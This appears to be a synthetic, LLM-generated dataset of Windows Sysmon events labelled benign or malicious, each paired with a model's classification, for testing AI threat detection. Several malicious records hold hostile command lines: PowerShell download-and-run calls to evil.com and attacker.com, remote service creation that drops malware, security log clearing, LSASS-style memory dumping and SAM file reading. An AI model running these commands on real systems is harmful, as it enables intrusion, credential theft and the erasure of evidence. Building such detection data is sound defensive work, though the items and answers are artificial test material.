{"EventID": 1, "EventTime": "2020-05-01 22:57:25", "UtcTime": "2020-05-01T22:57:25.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -ExecutionPolicy Bypass -Command Clear-EventLog -LogName Security", "ProcessId": "1300", "ProcessGUID": "{6bbf237a-0514-5eac-0514-000000000514}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1250", "ParentProcessGUID": "{6bbf237a-04e2-5eac-04e2-0000000004e2}", "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "log_clearing", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:25] | PID=1300 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell -ExecutionPolicy Bypass -Command Clear-EventLog -LogName Security", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell executed with ExecutionPolicy Bypass to clear the Security event log, a clear defense evasion technique to hide malicious activity traces. Running under NETWORK SERVICE account makes this highly suspicious.", "confidence": "high", "attack_technique": "defense_evasion"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:15", "UtcTime": "2020-05-01T22:57:15.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\wbem\\wmic.exe", "CommandLine": "wmic /node:192.168.1.100 /user:admin /password:Password123 process call create \"powershell.exe -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://evil.com/revshell.ps1')\\\"\"", "ProcessId": "2510", "ProcessGUID": "{6bbf237a-09ce-5eac-09ce-0000000009ce}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:15] | PID=2510 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\wbem\\wmic.exe | Parent=C:\\Windows\\explorer.exe | CMD=wmic /node:192.168.1.100 /user:admin /password:Password123 process call create \"powershell.exe -c \\\"IEX (New-Object System.Net.WebClient).DownloadString('http://evil.com/revshell.ps1')\\\"\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "WMIC executing remote PowerShell command with hardcoded credentials to download and execute a script from suspicious domain (evil.com/revshell.ps1), indicating lateral movement and command execution for reverse shell deployment.", "confidence": "high", "attack_technique": "remote_execution"}}
{"EventID": 1, "EventTime": "2025-10-10 08:00:40", "UtcTime": "2025-10-10T08:00:40.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe C:\\Users\\jsmith\\Documents\\notes.txt", "ProcessId": "9012", "ProcessGUID": "{af00571d-f002-5eb1-1000-000000000800}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5ead-1000-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:40] | PID=9012 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\notepad.exe | Parent=C:\\Windows\\explorer.exe | CMD=notepad.exe C:\\Users\\jsmith\\Documents\\notes.txt", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User opening a text file in their Documents folder with notepad launched from explorer.exe - standard legitimate desktop activity with normal parent-child relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:00:00", "UtcTime": "2025-10-10T08:00:00.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c dir C:\\Users", "ProcessId": "4512", "ProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000400}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5fbd-1100-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:00] | PID=4512 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c dir C:\\Users", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing a simple directory listing command via cmd.exe spawned from explorer.exe - typical legitimate user activity for browsing file system contents.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:05", "UtcTime": "2020-05-01T22:56:05.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/evil.ps1')\\\"\")", "ProcessId": "5396", "ProcessGUID": "{6bbf237a-1514-5eac-1514-000000001514}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "4128", "ParentProcessGUID": "{6bbf237a-1020-5eac-1020-000000001020}", "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c start rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/evil.ps1')\\\"\")", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lolbin_execution", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:05] | PID=5396 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\rundll32.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/evil.ps1')\\\"\")", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Rundll32.exe abusing JavaScript protocol handler to execute obfuscated PowerShell that downloads and executes a remote script from attacker.com with execution policy bypass - classic multi-stage attack chain combining defense evasion and command-and-control.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 13, "EventTime": "2025-10-10 08:04:30", "UtcTime": "2025-10-10T08:04:30.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "2014", "ProcessGUID": "{12345678-1234-5678-1234-567812340018}", "User": "WORKSTATION\\user", "IntegrityLevel": "Medium", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ShowSuperHidden", "EventType": "SetValue", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:04:30] | PID=2014 | User=WORKSTATION\\user | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "PowerShell execution by a regular user with no command-line arguments or suspicious indicators visible. Without additional context showing malicious commands or parameters, this appears to be normal PowerShell usage.", "confidence": "medium", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:58:35", "UtcTime": "2020-05-01T22:58:35.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -command \"Get-Content C:\\ProgramData\\sensitive.txt\"", "ProcessId": "1311", "ProcessGUID": "{6bbf237a-051f-5eac-051f-00000000051f}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1300", "ParentProcessGUID": "{6bbf237a-0514-5eac-0514-000000000514}", "ParentCommandLine": "cmd.exe /c type C:\\Windows\\System32\\config\\SAM", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:58:35] | PID=1311 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell -command \"Get-Content C:\\ProgramData\\sensitive.txt\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "NETWORK SERVICE account using PowerShell to read a file named \"sensitive.txt\" from ProgramData directory - unusual for this system account and suggests credential/data discovery activity.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2025-10-10 08:01:20", "UtcTime": "2025-10-10T08:01:20.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\VideoLAN\\VLC\\vlc.exe", "CommandLine": "\"C:\\Program Files\\VideoLAN\\VLC\\vlc.exe\" C:\\Users\\jsmith\\Videos\\movie.mp4", "ProcessId": "1123", "ProcessGUID": "{e3679bde-7f83-c622-1800-000000000c00}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5fbd-1100-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Program Files\\VideoLAN\\VLC\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:01:20] | PID=1123 | User=CORP\\jsmith | Image=C:\\Program Files\\VideoLAN\\VLC\\vlc.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\VideoLAN\\VLC\\vlc.exe\" C:\\Users\\jsmith\\Videos\\movie.mp4", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "VLC media player launched by Windows Explorer to play a video file from the user's Videos folder - standard legitimate user activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:02:00", "UtcTime": "2025-10-10T08:02:00.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -Command Get-Process", "ProcessId": "5678", "ProcessGUID": "{f0228d72-1658-5eb7-1000-000000000e00}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "3456", "ParentProcessGUID": "{de006b50-1436-5eb5-1000-000000000c00}", "ParentCommandLine": "cmd.exe /c powershell", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:02:00] | PID=5678 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell.exe -ExecutionPolicy Bypass -Command Get-Process", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "PowerShell executing Get-Process command to list running processes - a standard administrative task with no obfuscation or suspicious parameters beyond the common ExecutionPolicy Bypass flag.", "confidence": "high", "attack_technique": ""}}
{"EventID": 3, "EventTime": "2025-11-05 09:47:55", "UtcTime": "2025-11-05T09:47:55.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe", "ProcessId": "9012", "ProcessGUID": "{9016def0-6023-905b-2c3e-ca449c9f2888}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "SourcePort": "50001", "DestinationIp": "192.168.65.3", "DestinationPort": "2375", "DestinationHostname": "", "Protocol": "TCP", "_label": "benign", "_source": "llm", "prompt": "[2025-11-05 09:47:55] | PID=9012 | User=CORP\\jsmith | Image=C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Docker Desktop application running from legitimate installation directory by domain user - standard containerization software usage.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:10", "UtcTime": "2020-05-01T22:56:10.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c wevtutil cl Security", "ProcessId": "1100", "ProcessGUID": "{6bbf237a-044c-5eac-044c-00000000044c}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "420", "ParentProcessGUID": "{6bbf237a-01a4-5eac-01a4-0000000001a4}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "log_clearing", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:10] | PID=1100 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c wevtutil cl Security", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Command clears the Security event log using wevtutil, a classic defense evasion technique to hide malicious activity. The unusual parent process (explorer.exe) and NETWORK SERVICE account make this highly suspicious.", "confidence": "high", "attack_technique": "defense_evasion"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:05", "UtcTime": "2020-05-01T22:56:05.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c wmic /node:DESKTOP-TARGET process call create \"powershell.exe -Command \\\"whoami > C:\\Users\\Public\\whoami.txt\\\"\"", "ProcessId": "1048", "ProcessGUID": "{6bbf237a-0418-5eac-0418-000000000418}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1024", "ParentProcessGUID": "{6bbf237a-0400-5eac-0400-000000000400}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:05] | PID=1048 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c wmic /node:DESKTOP-TARGET process call create \"powershell.exe -Command \\\"whoami > C:\\Users\\Public\\whoami.txt\\\"\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "WMIC used for remote process execution on DESKTOP-TARGET to run PowerShell command that outputs whoami to a public directory - clear lateral movement and reconnaissance pattern with suspicious parent process (explorer.exe spawning cmd as SYSTEM).", "confidence": "high", "attack_technique": "remote_execution"}}
{"EventID": 11, "EventTime": "2025-10-30 03:33:05", "UtcTime": "2025-10-30T03:33:05.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "5678", "ProcessGUID": "{567289ab-2cde-5617-e89a-8600585b8444}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\VideoLAN\\VLC\\vlc.exe", "TargetFilename": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\vlc.log", "CreationUtcTime": "2025-10-30T03:33:05.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-30 03:33:05] | PID=5678 | User=CORP\\jsmith | Image=C:\\Program Files\\VideoLAN\\VLC\\vlc.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "VLC media player execution from its standard installation directory by a domain user - normal media playback application usage.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:29", "UtcTime": "2020-05-01T22:56:29.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe comsvcs.dll,MiniDump 1337 c:\\temp\\la.dmp full", "ProcessId": "1025", "ProcessGUID": "{6bbf237a-0401-5eac-0401-000000000401}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1024", "ParentProcessGUID": "{6bbf237a-0400-5eac-0400-000000000400}", "ParentCommandLine": "cmd.exe /c start rundll32.exe comsvcs.dll,MiniDump 1337 c:\\temp\\la.dmp full", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "memory_credential_dumping", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:29] | PID=1025 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\rundll32.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=rundll32.exe comsvcs.dll,MiniDump 1337 c:\\temp\\la.dmp full", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Rundll32.exe executing comsvcs.dll MiniDump to dump process memory (PID 1337) to disk - classic credential dumping technique often used to extract LSASS memory for credential theft.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:00", "UtcTime": "2020-05-01T22:57:00.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\sc.exe", "CommandLine": "sc \\\\TARGET-PC create MaliciousService binpath= \"cmd.exe /c powershell -c \\\"(New-Object System.Net.WebClient).DownloadFile('http://evil.com/malware.exe', 'C:\\\\Windows\\\\Temp\\\\malware.exe'); Start-Process C:\\\\Windows\\\\Temp\\\\malware.exe\\\"\"", "ProcessId": "2500", "ProcessGUID": "{6bbf237a-09c4-5eac-09c4-0000000009c4}", "ParentImage": "C:\\Windows\\System32\\services.exe", "ParentProcessId": "704", "ParentProcessGUID": "{6bbf237a-02c0-5eac-02c0-0000000002c0}", "ParentCommandLine": "C:\\Windows\\System32\\services.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:00] | PID=2500 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\sc.exe | Parent=C:\\Windows\\System32\\services.exe | CMD=sc \\\\TARGET-PC create MaliciousService binpath= \"cmd.exe /c powershell -c \\\"(New-Object System.Net.WebClient).DownloadFile('http://evil.com/malware.exe', 'C:\\\\Windows\\\\Temp\\\\malware.exe'); Start-Process C:\\\\Windows\\\\Temp\\\\malware.exe\\\"\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Remote service creation on TARGET-PC with malicious payload that downloads and executes malware from evil.com - clear lateral movement and malware deployment attack chain.", "confidence": "high", "attack_technique": "lateral_movement"}}
